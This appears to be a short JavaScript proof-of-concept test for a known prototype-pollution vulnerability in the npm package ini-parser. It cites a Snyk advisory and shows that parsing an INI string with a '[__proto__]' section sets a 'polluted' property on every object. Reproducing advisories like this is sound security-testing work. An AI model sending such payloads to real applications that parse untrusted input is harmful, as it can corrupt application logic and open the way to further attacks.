// // https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
// test("prototype pollution in ini-parser", () => {
console.log({}.polluted);

  let a = require("ini-parser");
  a.parse("[__proto__]\npolluted=yes");

console.log({}.polluted);
// });
